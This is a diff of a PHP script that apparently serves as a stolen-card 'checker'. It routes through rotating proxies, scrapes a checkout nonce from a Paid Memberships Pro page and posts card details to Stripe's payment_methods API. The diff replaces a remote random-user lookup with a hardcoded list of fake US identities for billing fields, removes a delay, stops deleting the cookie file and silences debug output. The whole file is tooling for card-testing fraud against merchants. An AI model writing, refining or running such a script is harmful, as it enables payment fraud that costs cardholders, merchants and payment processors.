@@ -3,9 +3,9 @@
 $cookieFilePath = 'cookie.txt';
 
 // Check if the file exists and delete it
-if (file_exists($cookieFilePath)) {
-   unlink($cookieFilePath);
-}
+//if (file_exists($cookieFilePath)) {
+  //  unlink($cookieFilePath);
+//}
 
 error_reporting(0);
 date_default_timezone_set('Asia/Jakarta');
@@ -89,28 +89,248 @@ $number6 = substr($cc, 0, 6);
 // Fetch random user data with delay
 $proxy = rebootproxys();
 list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
-$ch = curl_init('https://randomuser.me/api/?nat=us&inc=name,location,email,phone');
-curl_setopt_array($ch, [
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_SSL_VERIFYPEER => false,
-    CURLOPT_SSL_VERIFYHOST => false,
-    CURLOPT_USERAGENT => 'Mozilla/5.0'
-]);
-$resposta = curl_exec($ch);
-curl_close($ch);
+$users = [
+    [
+        'firstname' => 'John',
+        'lastname'  => 'Doe',
+        'email'     => 'john.doe@example.com',
+        'phone'     => '555-123-4567',
+        'zip'       => '90210',
+        'state'     => 'California',
+        'city'      => 'Los Angeles',
+        'street'    => 'Sunset Blvd'
+    ],
+    [
+    'firstname' => 'Michael',
+    'lastname'  => 'Johnson',
+    'email'     => 'michael.johnson@example.com',
+    'phone'     => '555-321-4567',
+    'zip'       => '90001',
+    'state'     => 'California',
+    'city'      => 'Los Angeles',
+    'street'    => 'Sunset Blvd'
+],
+[
+    'firstname' => 'Emily',
+    'lastname'  => 'Davis',
+    'email'     => 'emily.davis@example.com',
+    'phone'     => '555-213-4455',
+    'zip'       => '60614',
+    'state'     => 'Illinois',
+    'city'      => 'Chicago',
+    'street'    => 'Lincoln Ave'
+],
+[
+    'firstname' => 'David',
+    'lastname'  => 'Martinez',
+    'email'     => 'david.martinez@example.com',
+    'phone'     => '555-777-2345',
+    'zip'       => '77001',
+    'state'     => 'Texas',
+    'city'      => 'Houston',
+    'street'    => 'Westheimer Rd'
+],
+[
+    'firstname' => 'Sophia',
+    'lastname'  => 'Garcia',
+    'email'     => 'sophia.garcia@example.com',
+    'phone'     => '555-642-8899',
+    'zip'       => '19103',
+    'state'     => 'Pennsylvania',
+    'city'      => 'Philadelphia',
+    'street'    => 'Market St'
+],
+[
+    'firstname' => 'James',
+    'lastname'  => 'Lee',
+    'email'     => 'james.lee@example.com',
+    'phone'     => '555-411-5678',
+    'zip'       => '75201',
+    'state'     => 'Texas',
+    'city'      => 'Dallas',
+    'street'    => 'Main St'
+],
+[
+    'firstname' => 'Olivia',
+    'lastname'  => 'Brown',
+    'email'     => 'olivia.brown@example.com',
+    'phone'     => '555-300-1122',
+    'zip'       => '98101',
+    'state'     => 'Washington',
+    'city'      => 'Seattle',
+    'street'    => 'Pine St'
+],
+[
+    'firstname' => 'Benjamin',
+    'lastname'  => 'Wilson',
+    'email'     => 'benjamin.wilson@example.com',
+    'phone'     => '555-123-7890',
+    'zip'       => '30301',
+    'state'     => 'Georgia',
+    'city'      => 'Atlanta',
+    'street'    => 'Peachtree St'
+],
+[
+    'firstname' => 'Ava',
+    'lastname'  => 'Moore',
+    'email'     => 'ava.moore@example.com',
+    'phone'     => '555-454-9988',
+    'zip'       => '33101',
+    'state'     => 'Florida',
+    'city'      => 'Miami',
+    'street'    => 'Ocean Dr'
+],
+[
+    'firstname' => 'Ethan',
+    'lastname'  => 'Taylor',
+    'email'     => 'ethan.taylor@example.com',
+    'phone'     => '555-655-4411',
+    'zip'       => '85001',
+    'state'     => 'Arizona',
+    'city'      => 'Phoenix',
+    'street'    => 'Camelback Rd'
+],
+[
+    'firstname' => 'Isabella',
+    'lastname'  => 'Anderson',
+    'email'     => 'isabella.anderson@example.com',
+    'phone'     => '555-878-3322',
+    'zip'       => '55401',
+    'state'     => 'Minnesota',
+    'city'      => 'Minneapolis',
+    'street'    => 'Nicollet Ave'
+],
+[
+    'firstname' => 'William',
+    'lastname'  => 'Thomas',
+    'email'     => 'william.thomas@example.com',
+    'phone'     => '555-998-7766',
+    'zip'       => '70112',
+    'state'     => 'Louisiana',
+    'city'      => 'New Orleans',
+    'street'    => 'Canal St'
+],
+[
+    'firstname' => 'Mia',
+    'lastname'  => 'Jackson',
+    'email'     => 'mia.jackson@example.com',
+    'phone'     => '555-556-7788',
+    'zip'       => '64101',
+    'state'     => 'Missouri',
+    'city'      => 'Kansas City',
+    'street'    => 'Main St'
+],
+[
+    'firstname' => 'Logan',
+    'lastname'  => 'White',
+    'email'     => 'logan.white@example.com',
+    'phone'     => '555-223-4466',
+    'zip'       => '46201',
+    'state'     => 'Indiana',
+    'city'      => 'Indianapolis',
+    'street'    => 'Meridian St'
+],
+[
+    'firstname' => 'Charlotte',
+    'lastname'  => 'Harris',
+    'email'     => 'charlotte.harris@example.com',
+    'phone'     => '555-789-3344',
+    'zip'       => '64111',
+    'state'     => 'Missouri',
+    'city'      => 'Kansas City',
+    'street'    => 'Gillham Rd'
+],
+[
+    'firstname' => 'Alexander',
+    'lastname'  => 'Clark',
+    'email'     => 'alex.clark@example.com',
+    'phone'     => '555-121-8899',
+    'zip'       => '53202',
+    'state'     => 'Wisconsin',
+    'city'      => 'Milwaukee',
+    'street'    => 'Brady St'
+],
+[
+    'firstname' => 'Amelia',
+    'lastname'  => 'Lewis',
+    'email'     => 'amelia.lewis@example.com',
+    'phone'     => '555-441-2299',
+    'zip'       => '64108',
+    'state'     => 'Missouri',
+    'city'      => 'Kansas City',
+    'street'    => 'Grand Blvd'
+],
+[
+    'firstname' => 'Daniel',
+    'lastname'  => 'Walker',
+    'email'     => 'daniel.walker@example.com',
+    'phone'     => '555-998-1122',
+    'zip'       => '27601',
+    'state'     => 'North Carolina',
+    'city'      => 'Raleigh',
+    'street'    => 'Fayetteville St'
+],
+[
+    'firstname' => 'Harper',
+    'lastname'  => 'Young',
+    'email'     => 'harper.young@example.com',
+    'phone'     => '555-665-8899',
+    'zip'       => '37201',
+    'state'     => 'Tennessee',
+    'city'      => 'Nashville',
+    'street'    => 'Broadway'
+],
+[
+    'firstname' => 'Jackson',
+    'lastname'  => 'Allen',
+    'email'     => 'jackson.allen@example.com',
+    'phone'     => '555-332-7788',
+    'zip'       => '96813',
+    'state'     => 'Hawaii',
+    'city'      => 'Honolulu',
+    'street'    => 'King St'
+],
+[
+    'firstname' => 'Evelyn',
+    'lastname'  => 'Scott',
+    'email'     => 'evelyn.scott@example.com',
+    'phone'     => '555-474-6655',
+    'zip'       => '49503',
+    'state'     => 'Michigan',
+    'city'      => 'Grand Rapids',
+    'street'    => 'Division Ave'
+],
+    [
+        'firstname' => 'Jane',
+        'lastname'  => 'Smith',
+        'email'     => 'jane.smith@example.com',
+        'phone'     => '555-987-6543',
+        'zip'       => '10001',
+        'state'     => 'New York',
+        'city'      => 'New York',
+        'street'    => '5th Avenue'
+    ],
+    [
+        'firstname' => 'Alex',
+        'lastname'  => 'Johnson',
+        'email'     => 'alex.johnson@example.com',
+        'phone'     => '555-246-1357',
+        'zip'       => '60601',
+        'state'     => 'Illinois',
+        'city'      => 'Chicago',
+        'street'    => 'Lake Shore Dr'
+    ]
+];
 
-$data = json_decode($resposta, true);
-
-$user = $data['results'][0];
-$firstname = $user['name']['first'] ?? '';
-$lastname  = $user['name']['last'] ?? '';
-$email     = $user['email'] ?? '';
-$phone     = $user['phone'] ?? '';
-$zip       = $user['location']['postcode'] ?? '';
-$state     = $user['location']['state'] ?? '';
-$city      = $user['location']['city'] ?? '';
-$street    = $user['location']['street']['name'] ?? '';
+$randomUser = $users[array_rand($users)];
+$firstname = $randomUser['firstname'];
+$lastname  = $randomUser['lastname'];
+$email     = $randomUser['email'];
+$phone     = $randomUser['phone'];
+$zip       = $randomUser['zip'];
+$state     = $randomUser['state'];
+$city      = $randomUser['city'];
+$street    = $randomUser['street'];
 
 // Optional: simulate user delay
 
@@ -133,7 +353,6 @@ curl_close($ch);
 
 $nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');
 
-sleep(rand(1, 2));
 // Submit payment details with delay between fields
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
@@ -720,12 +939,7 @@ else {
 curl_close($ch);
 ob_flush();
 flush();
-echo "<b>1REQ Result:</b> $result1<br><br>";
-echo "<b>2REQ Result:</b> $result2<br><br>";
+//echo "<b>1REQ Result:</b> $result1<br><br>";
+//echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
-
-
-
-
-
